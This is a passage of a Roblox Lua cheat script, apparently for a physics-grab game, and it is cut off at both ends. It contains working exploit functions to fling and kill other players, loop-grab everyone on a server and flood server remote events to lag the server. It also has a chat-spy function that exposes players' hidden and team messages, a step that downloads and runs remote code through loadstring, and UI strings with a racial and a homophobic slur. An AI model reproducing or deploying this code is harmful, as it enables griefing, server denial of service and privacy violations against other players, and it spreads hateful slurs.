					elseif e.Parent.Parent.Parent.Name == "Plot3" then
						currentHouseS = 3
					elseif e.Parent.Parent.Parent.Name == "Plot4" then
						currentHouseS = 4
					elseif e.Parent.Parent.Parent.Name == "Plot5" then
						currentHouseS = 5
					end
                end
            end
        end
	end
end

function mouseTargetInspectF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if mouse.Target then
        if mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
            currentInspectS = 1
            currentHouseInspectS = 0
        elseif mouse.Target.Parent:IsDescendantOf(workspace.Plots) then
                local current = mouse.Target
                repeat
                   current = current.Parent
                until string.match(current.Name, "Plot")
                for i = 1, 5 do
                    if current.Name == "Plot"..i then
                        currentHouseInspectS = i
                    end
                end
                currentInspectS = 2
        elseif mouse.Target.Parent:IsDescendantOf(workspace.PlotItems) or string.match(mouse.Target.Parent.Parent.Name, "SpawnedInToys") or mouse.Target.Parent.Parent:FindFirstChild("SpawningPlatform") then
            currentInspectS = 3
            currentHouseInspectS = 0
        else
            currentInspectS = 4
            currentHouseInspectS = 0
        end
    end
end

--GRABFUNCS--
function flingF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "GrabParts" then
            local part_to_impulse = model["GrabPart"]["WeldConstraint"].Part1
            if part_to_impulse then
                model:GetPropertyChangedSignal("Parent"):Connect(function()
                    if not model.Parent and flingT then
                        uis.InputBegan:Connect(function(inp, chat)
                            if inp.UserInputType == Enum.UserInputType.MouseButton2 then
                                local velocityObj = Instance.new("BodyVelocity", part_to_impulse)
                                velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                velocityObj.Velocity = cam.CFrame.lookVector * strengthV
                                deb:AddItem(velocityObj, 1)
                            end
                        end)
                    end
                end)
            end
        end
    end)
end

function killGrabF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    workspace.ChildAdded:Connect(function(e)
        if e.Name == "GrabParts" and killGrabT and e.GrabPart.WeldConstraint.Part1.Parent.Name ~= char.Name then
            e.GrabPart.WeldConstraint.Part1.Parent:FindFirstChildOfClass("Humanoid").Health = 0
        end
    end)
end

function infLineExtendF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    uis.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseWheel then
            if lineDistanceV < 11 then
                lineDistanceV = 11
            end
    
            if input.Position.Z > 0 then
                lineDistanceV = lineDistanceV + increaseLineExtendV
            elseif input.Position.Z < 0 then
                lineDistanceV = lineDistanceV - increaseLineExtendV
            end
        end
    end)
    
    workspace.ChildAdded:Connect(function(child)
        if child.Name == "GrabParts" and child:IsA("Model") then
            if infLineExtendT and uis.MouseEnabled then
                local grabPartsModel = child

                grabPartsModel:WaitForChild("GrabPart")
                grabPartsModel:WaitForChild("DragPart")
                    
                local clonedDragPart = grabPartsModel.DragPart:Clone()
                clonedDragPart.Name = "DragPart1"
                clonedDragPart.AlignPosition.Attachment1 = clonedDragPart.DragAttach
                clonedDragPart.Parent = grabPartsModel
                
                lineDistanceV = (clonedDragPart.Position - cam.CFrame.Position).Magnitude
    
                clonedDragPart.AlignOrientation.Enabled = false
                grabPartsModel.DragPart.AlignPosition.Enabled = false
    
                task.spawn(function()
                    while grabPartsModel.Parent do
                        clonedDragPart.Position = cam.CFrame.Position + cam.CFrame.LookVector * lineDistanceV
                        task.wait()
                    end
            
                    lineDistanceV = 0
                end)
            end
        end
    end)
end

--ANTIFUNCS--
function antiGrab1F()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while antiGrab1T and task.wait() do
        if plr.IsHeld.Value == true and antiGrab1T == true then
            if hrp ~= nil then
                if antiGrab1AnchorT then
                    hrp.Anchored = true
                    while plr.IsHeld.Value == true do rs.CharacterEvents.Struggle:FireServer(plr);wait(0.001) end
                    hrp.Anchored = false
                elseif not antiGrab1AnchorT then
                    while plr.IsHeld.Value == true do rs.CharacterEvents.Struggle:FireServer(plr);wait(0.001) end
                end
            end
        end
    end
end

function antiBlob1F()
    workspace.DescendantAdded:Connect(function(toy)
        if toy.Name == "CreatureBlobman" and toy.Parent ~= inv and antiBlob1T then
            wait()
            toy.LeftDetector:Destroy()
            toy.RightDetector:Destroy()
        end
    end)
end

function antiExplodeF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "Part" and char ~= nil and antiExplodeT then
            local mag = (model.Position - hrp.Position).Magnitude
            if mag <= 20 then
                hrp.Anchored = true
				wait(0.01)
                while char["Right Arm"].RagdollLimbPart.CanCollide == true do wait(0.001) end
                hrp.Anchored = false
            end
        end
    end)
end

function antiLagF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if antiLagT == true then
        plr.PlayerScripts.CharacterAndBeamMove.Disabled = true
    elseif antiLagT == false then
        plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
    end
end

function antiStickyF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if antiStickyT == true then
        plr.PlayerScripts.StickyPartsTouchDetection.Disabled = true
    elseif antiStickyT == false then
        plr.PlayerScripts.StickyPartsTouchDetection.Enabled = true
    end
end

--LOOPFUNCS--
function getPlayerList()
    local playerList = {}
    for _, p in pairs(game.Players:GetPlayers()) do
        if p ~= plr then
            table.insert(playerList, p.Name .. " (" .. p.DisplayName .. ")")
        end
    end
    return playerList
end

function loopPlayerBlobF()
    updateCurrentBlobmanF()
    for i, e in ipairs(playersInLoop2V) do
        local player
        if game.Players:FindFirstChild(e) then
            player = game.Players:FindFirstChild(e)
        else
            continue
        end
        if blobLoopT then
            blobGrabF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
            wait(0.05)
            blobDropF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
            wait(0.05)
            silentBlobGrabF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
        end
    end
    while task.wait(6.25) and blobLoopT do
        for i, e in ipairs(playersInLoop2V) do
            local player
            if game.Players:FindFirstChild(e) then
                player = game.Players:FindFirstChild(e)
            else
                continue
            end
            blobGrabF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
            wait(0.05)
            blobDropF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
            wait(0.05)
            silentBlobGrabF(currentBlobS, player.Character:WaitForChild("HumanoidRootPart"), "Left")
        end
    end
end

--PLAYERFUNCS--
function updateWalkSpeedF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if walkSpeedT then
        hum.WalkSpeed = walkSpeedV
    elseif not walkSpeedT then
        hum.WalkSpeed = 16
    end
    hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        if walkSpeedT then
            hum.WalkSpeed = walkSpeedV
        elseif not walkSpeedT then
            hum.WalkSpeed = 16
        end
    end)
end

function updateJumpPowerF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if jumpPowerT then
        hum.JumpPower = jumpPowerV
    elseif not jumpPowerT then
        hum.JumpPower = 24
    end
end

function updateNoClipF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while noClipT and task.wait(0.1) do
        char.Head.CanCollide = false
        char.Torso.CanCollide = false
    end
    if not noClipT then
        char.Head.CanCollide = true
        char.Torso.CanCollide = true
    end
end

function updateInfJumpF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    uis.JumpRequest:Connect(function()
        if infJumpT and not infJumpD then
            infJumpD = true
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
            wait()
            infJumpD = false
        end
    end)
end

function updateFloatF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if floatT then
    local float = Instance.new('Part')
    float.Name = "floatPart"
    float.Parent = char
    float.Transparency = 1
    float.Size = Vector3.new(2,0.2,1.5)
    float.Anchored = true
    float.CFrame = hrp.CFrame * CFrame.new(0, floatY, 0)
    local function floatLoop()
        if char:FindFirstChild("floatPart") and hrp then
            float.CFrame = hrp.CFrame * CFrame.new(0, floatY, 0)
        end
    end			
    floatFunc = rs2.Heartbeat:Connect(floatLoop)
    elseif not floatT then
        if char:FindFirstChild("floatPart") then
            char:FindFirstChild("floatPart"):Destroy()
        end
    end
end

function masslessF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    for i, e in char:GetChildren() do
        if e:IsA("BasePart") and masslessT then
            e.Massless = true
        elseif e:IsA("BasePart") and not masslessT then
            e.Massless = false
        end
    end
end





--SERVERFUNCS--
function updateBlobLoopServerF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    updateCurrentBlobmanF()
    for i, e in game.Players:GetPlayers() do
        if e.Character:FindFirstChild("HumanoidRootPart") == nil then continue end
        if e.Character:FindFirstChild("HumanoidRootPart") and hum then
            if currentBlobS ~= nil and blobLoopServerT then
                blobGrabF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                wait(0.05)
                blobDropF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                wait(0.05)
                silentBlobGrabF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
            end
        end
    end
    while blobLoopServerT and task.wait(6.25) do
        for i, e in game.Players:GetPlayers() do
            if e.Character:FindFirstChild("HumanoidRootPart") == nil then continue end
            if e.Character:FindFirstChild("HumanoidRootPart") and hum then
                if currentBlobS ~= nil and blobLoopServerT then
                    blobGrabF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                    wait(0.05)
                    blobDropF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                    wait(0.05)
                    silentBlobGrabF(currentBlobS, e.Character:WaitForChild("HumanoidRootPart"), "Left")
                end
            end
        end
    end
end

function lagF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while wait(1) and lagT do
        for a = 0, linesV do
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player.Character.Torso ~= nil then
                    rs.GrabEvents.CreateGrabLine:FireServer(player.Character.Torso, player.Character.Torso.CFrame)
                end
            end
        end
    end
end

function pingF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while task.wait() and pingT do
        rs.GrabEvents.ExtendGrabLine:FireServer(string.rep("Balls Balls Balls Balls", packetsV))
    end
end

function shurikenLagServerF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if shurikenLagServerT then
        local ToyFolder
        for _, v in pairs(workspace.Plots:GetChildren()) do
            for _, b in pairs(v.PlotSign.ThisPlotsOwners:GetChildren()) do
                if b.Value == plr.Name then
                    ToyFolder = workspace.PlotItems[v.Name]
                end
            end
        end
        local decoys = {}
        local shurikens = {}

        for _, obj in pairs(ToyFolder:GetChildren()) do
            if obj:IsA("Model") then
                if obj.Name == "NpcRobloxianMascot" then
                    table.insert(decoys, obj)
                elseif obj.Name == "NinjaShuriken" then
                    table.insert(shurikens, obj)
                end
            end
        end

        local maxshurikensperdecoy = 8

        for decoyindex, decoy in ipairs(decoys) do
            local decoyHRP = decoy:FindFirstChild("HumanoidRootPart")
            if decoyHRP and shurikenLagServerT then
                local startindex = (decoyindex - 1) * maxshurikensperdecoy + 1
                local endindex = startindex + maxshurikensperdecoy - 1
                for shurikenindex = startindex, endindex do
                    local shuriken = shurikens[shurikenindex]
                    if not shuriken then
                        break
                    end
                    local StickyPart = shuriken:FindFirstChild("StickyPart")
                    if StickyPart then
                        StickyPart.CanTouch = true
                        for _, part in pairs(decoy:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                        local BodyPosition = Instance.new("BodyPosition")
                        BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        BodyPosition.P = 10000
                        BodyPosition.D = 500
                        BodyPosition.Parent = StickyPart
                        for _, part in pairs(shuriken:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                        for _, child in pairs(StickyPart:GetChildren()) do
                            if child.Name == "TouchInterest" then
                                child:Destroy()
                            end
                        end
                        task.defer(function()
                            repeat
                                StickyPart.AssemblyAngularVelocity = Vector3.new(
                                    math.random(-100, 100) * 50,
                                    math.random(-100, 100) * 50,
                                    math.random(-100, 100) * 50
                                )
                                BodyPosition.Position = Vector3.new(
                                    decoyHRP.Position.X,
                                    decoyHRP.Position.Y - 4,
                                    decoyHRP.Position.Z
                                )
                                wait(0.0001)
                                BodyPosition.Position = Vector3.new(
                                    decoyHRP.Position.X,
                                    decoyHRP.Position.Y + 3,
                                    decoyHRP.Position.Z
                                )
                                wait(0.0001)
                            until not shurikenLagServerT or not shuriken.Parent or not decoy.Parent
                        end)
                    end
                    wait()
                end
            end
            wait()
        end
    end
end

--KEYBINDFUNCS--
function tpF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if not slideTPT then
        if char and hrp and mouse.Target and not slideTPT then hrp.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z) end
    elseif slideTPT then
        if not slideTPD and slideTPT and mouse.Target then
            slideTPD = true
            local info = TweenInfo.new(
                0.5, 
                Enum.EasingStyle.Sine, 
                Enum.EasingDirection.In,
                0,
                false,
                0
            )
            local info2 = TweenInfo.new(
                0.5, 
                Enum.EasingStyle.Sine, 
                Enum.EasingDirection.In,
                0,
                true,
                0
            )
            local e = {["CFrame"] = CFrame.new(mouse.Hit.x, mouse.Hit.y + 3, mouse.Hit.z)}
            local e2 = {FieldOfView = 100}
            char.Head.CanCollide = false
            char.Torso.CanCollide = false
            game:GetService("TweenService"):Create(hrp, info, e):Play()
            game:GetService("TweenService"):Create(cam, info2, e2):Play()
            wait(0.55)
            char.Head.CanCollide = true
            char.Torso.CanCollide = true
            cam.FieldOfView = 70
            slideTPD = false
        end
    end
end

function floatUpF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if floatUpT and not floatDownT then
        floatY = -1.6
    elseif not floatUpT then
        floatY = -3.1
    end
end

function floatDownF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if floatDownT and not floatUpT then
        floatY = -3.6
    elseif not floatDownT then
        floatY = -3.1
    end
end

function inspectF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    mouseTargetInspectF()
    inspectInfoF()
    if not inspectD then
        inspectD = true
        if inspectT then
            if currentInspectS == 1 then
                currentInspectedAdorneeS = mouse.Target.Parent
                currentInspectedPartS = mouse.Target
                highlightC = highlight:Clone()
                highlightC.Adornee = mouse.Target.Parent
                highlightC.Parent = mouse.Target
                highlightC.FillColor = Color3.fromRGB(255, 255, 255)
                highlightC.OutlineColor = Color3.fromRGB(160, 11, 11)
            elseif currentInspectS == 2 then
                currentInspectedAdorneeS = workspace.Plots:FindFirstChild("Plot"..currentHouseInspectS)
                currentInspectedPartS = mouse.Target
                highlightC = highlight:Clone()
                highlightC.Adornee = workspace.Plots:FindFirstChild("Plot"..currentHouseInspectS)
                highlightC.Parent = mouse.Target
                highlightC.FillColor = Color3.fromRGB(255, 255, 255)
                highlightC.OutlineColor = Color3.fromRGB(0, 60, 180)
            elseif currentInspectS == 3 then
                currentInspectedAdorneeS = mouse.Target.Parent
                currentInspectedPartS = mouse.Target
                highlightC = highlight:Clone()
                highlightC.Adornee = mouse.Target.Parent
                highlightC.Parent = mouse.Target
                highlightC.FillColor = Color3.fromRGB(255, 255, 255)
                highlightC.OutlineColor = Color3.fromRGB(20, 170, 20)
            elseif currentInspectS == 4 then
                currentInspectedAdorneeS = mouse.Target.Parent
                currentInspectedPartS = mouse.Target
                highlightC = highlight:Clone()
                highlightC.Adornee = mouse.Target.Parent
                highlightC.Parent = mouse.Target
                highlightC.FillColor = Color3.fromRGB(255, 255, 255)
                highlightC.OutlineColor = Color3.fromRGB(180, 20, 180)
            end
        elseif not inspectT then
            currentInspectS = 0
            currentHouseInspectS = 0
            currentInspectedPartS = nil
            currentInspectedAdorneeS = nil
            highlightC:Destroy()
        end
        wait(0.1)
        inspectD = false
    end
end

function inspectInfoF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if not inspectInfoOnT and inspectInfoT and inspectT and currentInspectS ~= 0 and currentInspectedPartS ~= nil and currentInspectedAdorneeS ~= nil then
        inspectInfoOnT = true
        billboardC = billboard:Clone()
        billboardC.Adornee = currentInspectedAdorneeS
        billboardC.Parent = currentInspectedPartS

        scrollframeC = scrollframe:Clone()
        scrollframeC.Parent = billboardC
        scrollframeC.Size = UDim2.new(0, 160, 0, 40)
        scrollframeC.ScrollBarImageTransparency = 1 

        textlabelC1 = textlabel:Clone()
        textlabelC1.Parent = scrollframeC
        textlabelC1.Size = UDim2.new(0, 140, 0, 40)
        if currentInspectS == 1 then
            textlabelC1.Text = currentInspectedAdorneeS.Name.." ("..game.Players:FindFirstChild(currentInspectedAdorneeS.Name).DisplayName..")"
        else
            textlabelC1.Text = currentInspectedAdorneeS.Name
        end
    elseif not inspectInfoT and inspectInfoOnT or not inspectT and inspectInfoOnT then
        inspectInfoOnT = false
        inspectInfoT = false
        billboardC:Destroy()
    end
end

function inspectBringF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if inspectT and currentInspectS ~= 2 and currentInspectS ~= 4 then
        returnPosS = hrp.CFrame
        hrp.CFrame = currentInspectedAdorneeS.PrimaryPart.CFrame + Vector3.new(7, 3, 0)
        wait(0.15)
        if currentInspectS == 1 then
            rs.GrabEvents.SetNetworkOwner:FireServer(currentInspectedAdorneeS:WaitForChild("HumanoidRootPart"), currentInspectedAdorneeS:WaitForChild("HumanoidRootPart").CFrame)
            wait(0.1)
            currentInspectedAdorneeS:WaitForChild("HumanoidRootPart").CFrame = returnPosS
        else
            rs.GrabEvents.SetNetworkOwner:FireServer(currentInspectedAdorneeS.PrimaryPart, currentInspectedAdorneeS.PrimaryPart.CFrame)
            wait(0.1)
            currentInspectedAdorneeS.PrimaryPart.CFrame = returnPosS
        end
        hrp.CFrame = returnPosS
    elseif not inspectT then
        if mouse.Target.Parent:IsDescendantOf(workspace.PlotItems) or string.match(mouse.Target.Parent.Parent.Name, "SpawnedInToys") or mouse.Target.Parent.Parent:FindFirstChild("SpawningPlatform") or mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
            returnPosS = hrp.CFrame
            mouseTargetS = mouse.Target
            hrp.CFrame = mouseTargetS.Parent.PrimaryPart.CFrame + Vector3.new(10, 3, 0)
            wait(0.15)
            if mouseTargetS.Parent:FindFirstChildOfClass("Humanoid") then
                rs.GrabEvents.SetNetworkOwner:FireServer(mouseTargetS.Parent:WaitForChild("HumanoidRootPart"), mouseTargetS.Parent:WaitForChild("HumanoidRootPart").CFrame)
                wait(0.1)
                mouseTargetS.Parent:WaitForChild("HumanoidRootPart").CFrame = returnPosS
            else
                rs.GrabEvents.SetNetworkOwner:FireServer(mouseTargetS.Parent.PrimaryPart, mouseTargetS.Parent.PrimaryPart.CFrame)
                wait(0.1)
                mouseTargetS.Parent.PrimaryPart.CFrame = returnPosS
            end
            hrp.CFrame = returnPosS
            mouseTargetS = nil
        end
    end
end

function ragdollSpamF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    while ragdollSpamT and not ragdollSpamD and not permRagdollT do
        ragdollSpamD = true
            local args = {
                [1] = hrp,
                [2] = 0
            }
            rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(unpack(args))
        task.wait(0.02)
        ragdollSpamD = false
    end
end

function setRagdollF(state)
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if char and char:FindFirstChild("HumanoidRootPart") then
        rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(hrp, state and 1 or 0)
        if hum then hum.PlatformStand = state end
    end
end

function permRagdollLoopF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if permRagdollRunningS then return end
    permRagdollRunningS = true
    while permRagdollT do
        setRagdollF(true)
        task.wait(0.5)
    end
    permRagdollRunningS = false
    setRagdollF(false)
end

function getBlobmanF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    updateCurrentHouseF()
    if currentHouseS == 0 then
        if inv then return inv:FindFirstChild("CreatureBlobman") end
        return nil
    else
        return workspace.PlotItems:FindFirstChild("Plot"..currentHouseS):FindFirstChild("CreatureBlobman")
    end
end

function spawnBlobmanF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    local spawnRemote = rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
    if spawnRemote then
        pcall(function()spawnRemote:InvokeServer("CreatureBlobman", hrp.CFrame*CFrame.new(0,0,-5),Vector3.new(0, -15.716, 0))end)
        task.wait(1)
        blobmanInstanceS = getBlobmanF()
    end
end

function destroyBlobmanF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if blobmanInstanceS and destroyAutoGucciT then
        if currentHouseS == 0 then
            local args = {[1] = blobmanInstanceS}
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then pcall(function()destroyRemote:FireServer(unpack(args))end)end
            blobmanInstanceS = nil
        else
            blobmanInstanceS.HumanoidRootPart.CFrame = workspace.Plots:FindFirstChild("Plot"..currentHouseS).TeslaCoil.ZapPart.CFrame
            blobmanInstanceS = nil
        end
    end
end

function ragdollLoopF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if ragdollLoopD then return end
    ragdollLoopD = true
    while sitJumpT do
        if char and hrp then
            local args={[1] = hrp, [2] = 0}
            rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(unpack(args))
        end
        task.wait()
    end
    ragdollLoopD = false
end

function sitJumpF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if not char or not hum then return end
    local startTime = tick()
    while autoGucciT and tick()-startTime<6 do
        if blobmanInstanceS then
            local seat = blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
            if seat and seat.Occupant ~= hum then seat:Sit(hum) end
        end
        task.wait(0.1)
        if char and hum then hum:ChangeState(Enum.HumanoidStateType.Jumping)end
        task.wait(0.1)
    end
    if blobmanInstanceS then destroyBlobmanF() end
    autoGucciT = false
    sitJumpT = false
end

function stopVelocityF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    hrp.AssemblyLinearVelocity = Vector3.zero
end

function zoomF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if zoomT then
        cam.FieldOfView = zoomV
    elseif not zoomT then
        cam.FieldOfView = 70
    end
end

--TOYFUNCS--
function addToysF()
end

--CHATFUNCS--
function spychatF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    publicItalics = true
    privateProperties = {
        Color = Color3.fromRGB(245, 245, 40); 
        Font = Enum.Font.SourceSansBold;
        TextSize = 18;
    }
    local StarterGui = game:GetService("StarterGui")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
    local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
    local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
    local instance = (_G.chatSpyInstance or 0) + 1
    _G.chatSpyInstance = instance
    local function onChatted(p, msg)
        if _G.chatSpyInstance == instance then
            if spychatT and (spySelfT or p~=player) then
                msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
                local hidden = true
                local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
                    if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and not publicSpyT and Players[packet.FromSpeaker].Team==player.Team)) then
                        hidden = false
                    end
                end)
                wait(1)
                conn:Disconnect()
                if hidden and spychatT then
                    if publicSpyT then
                        saymsg:FireServer((publicItalics and '').."{SPY} [".. p.Name .. "(" .. p.DisplayName .. ")" .."]: "..msg,"All")
                    else
                        privateProperties.Text = "{SPY} [".. p.Name .. "(" .. p.DisplayName .. ")" .."]: "..msg
                        StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
                    end
                end
            end
        end
    end
    for _,p in ipairs(Players:GetPlayers()) do
        p.Chatted:Connect(function(msg) onChatted(p,msg) end)
    end
    Players.PlayerAdded:Connect(function(p)
        p.Chatted:Connect(function(msg) onChatted(p,msg) end)
    end)
    privateProperties.Text = "{SPY "..(spychatT and "EN" or "DIS").."ABLED}"
    StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
    if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
    local chatFrame = player.PlayerGui.Chat.Frame
    chatFrame.ChatChannelParentFrame.Visible = true
    chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end







local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/BlizTBr/scripts/main/Orion%20X')))()
OrionLib:MakeNotification({
Name = "Wsp Niggers!",
Content = "Wait for the script to load mafaka",
Image = "rbxassetid://15295869832",
Time = 5
})

local Window = OrionLib:MakeWindow({
    Name = "Ratwowee scripts",
    HidePremium = false,
    SaveConfig = true,
    IntroEnabled = true,
    IntroText = "Gayass script by Ratwowee",
    IntroIcon = "rbxassetid://16602754611", -- tu peux changer l'asset ID si tu veux un autre logo
    ConfigFolder = "PWNLoader"
})

local Tab = Window:MakeTab({
Name = "Credits",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

Tab:AddLabel("CREATOR: ratwowee")



local PlayerTab = Window:MakeTab({
    Name = "Player",
    Icon = "rbxassetid://18719810809"
})

PlayerTab:AddButton({
    Name = "Rejoin",
    Callback = function()
        print("Rejoin Game...")
        local player = game.Players.LocalPlayer
        local teleportService = game:GetService("TeleportService")
        local placeId = game.PlaceId
        

        teleportService:Teleport(placeId, player)
    end    
})

WalkSpeedEnabled = false
WalkSpeedValue = 5

WalkSpeedToggle = PlayerTab:AddToggle({
   Name = "Walk Speed Toggle",
   Default = false,
   Callback = function(Value)
       WalkSpeedEnabled = Value
       while WalkSpeedEnabled do
           local Character = game.Players.LocalPlayer.Character
           if Character and Character:FindFirstChild("Humanoid") and Character:FindFirstChild("HumanoidRootPart") then
               Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame + Character.Humanoid.MoveDirection * (WalkSpeedValue / 10)
           end
           task.wait()
       end
       if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
           game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
       end
   end
})

PlayerTab:AddSlider({
   Name = "Walk Speed Sliders",
   Min = 50,
   Max = 500,
   Default = 50,
   Color = Color3.fromRGB(255,255,255),
   Increment = 10,
   ValueName = "Speed",
   Callback = function(Value)
       WalkSpeedValue = Value
   end    
})

local player = game.Players.LocalPlayer
local jumpPower = 24
local loopJump = false

local function setJumpPower(power)
    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid.JumpPower = power
    end
end

local function startLoopJump()
    while loopJump do
        if player and player.Character and player.Character:FindFirstChild("Humanoid") then
            setJumpPower(jumpPower)
        end
        wait()
    end
end

player.CharacterAdded:Connect(function(character)
    wait()
    if loopJump then
        setJumpPower(jumpPower)
        startLoopJump()
    end
end)

PlayerTab:AddToggle({
    Name = "Jump Power Toggle",
    Default = false,
    Callback = function(Value)
        loopJump = Value
        if loopJump then
            setJumpPower(jumpPower)
            startLoopJump()
        else
            setJumpPower(24)
        end
    end
})

PlayerTab:AddSlider({
    Name = "Jump Power Sliders",
    Min = 24,
    Max = 500,
    Default = 24,
    Increment = 10,
    ValueName = "Power",
    Callback = function(Value)
